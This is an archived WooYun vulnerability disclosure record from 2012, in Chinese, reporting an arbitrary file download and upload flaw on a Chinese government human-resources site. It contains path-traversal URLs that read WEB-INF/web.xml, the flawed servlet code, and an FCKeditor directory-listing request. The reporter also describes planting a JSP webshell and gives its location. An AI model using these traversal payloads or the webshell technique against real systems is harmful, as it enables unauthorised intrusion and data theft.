{"id": 17490, "wybug_id": "wooyun-2012-010563", "wybug_title": "人力资源部某站任意文件下载/上传", "wybug_corp": "人力资源部", "wybug_author": "possible", "wybug_date": "2012-08-06 10:49", "wybug_open_date": "2012-09-20 10:50", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-20：\t细节向公众公开  简要描述： 人力资源部某站任意文件下载/上传 详细说明：  没有太多技术含量,一个下载点获得站点配置信息原请求:http://www.mohrss.gov.cn/download?path=UserFiles/File/66dd5f26-8b7e-4d38-882d-147c50702604.doc简单猜猜:http://www.mohrss.gov.cn/download?path=WEB-INF/web.xml失败了http://www.mohrss.gov.cn/download?path=UserFiles/File/aa/../66dd5f26-8b7e-4d38-882d-147c50702604.doc成功了，说明治标不治本的限制很容易猜到http://www.mohrss.gov.cn/download?path=UserFiles/../WEB-INF/web.xml可以下载了.对应后台代码如下:public void service(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    PrintWriter out = null;    try {      String path = request.getParameter(\"path\");      if ((path == null) || (\"\".equalsIgnoreCase(path)))        return;      String path;      if (path.toLowerCase().contains(\"UserFiles\".toLowerCase())) {  //这个限制有点扯淡        String pathString =           GlobalDownload.GetPropertyValue(\"downloadpath\");        String tempPath = Global.SERVER_ROOT_PATH + \"/\" + path;        if (!FileOperator.FileIsExists(tempPath)) {                //如果本服务器不存在文件              SynchronizeFiles.synchronizeFile(pathString + \"/\" + path, //则远程同步文件            tempPath);        }        download(path, request, response);      } else if (path.toUpperCase().contains(\"WEB-INF\")) {        out = response.getWriter();        response.setCharacterEncoding(\"GBK\");        String ckeditorCallBack = \"<script type=\\\"text/javascript\\\">while(true)(alert('Hello, please click on the download!'));</script>\";        out.println(ckeditorCallBack);        out.flush();      }    }    catch (Exception e) {      e.printStackTrace();    } finally {      if (out != null)        out.close();    }  }在web.xml中找到fck路径:列目录:http://www.mohrss.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../具体利用就不说了，大家都懂的...总的来说这个站做的还是不错的，如果不是这点小问题想直接渗透还是挺不容易的，我猜的.而且管理员也挺勤快shell一天就给删了，可惜管理员不是搞安全的不知道根源在哪里!什么也没干，简单路过，未动任何东西，留下shell证明危害很大，系统权限http://www.mohrss.gov.cn/UserFiles/Image/shell.jsp或许可以渗透内网...(不知道)就到这吧顺便说一下，这个http://www.12333.gov.cn/shell.jsp 貌似一套源码，也许人力资源部都用这一套东西不继续看了，自己找找吧.   漏洞证明：  略   修复方案：  修改fck   版权声明：转载请注明来源 possible@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-08-06 13:26 厂商回复： CNVD确认漏洞情况，作为紧急事件上报国务院某信息安全协调机构处置。按完全影响机密性、完整性，部分影响可用性进行评分，rank=9.67*1.0*2.0=19.34 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-11-23 13:47 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  草。19.34rank，一个FCK都这么给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}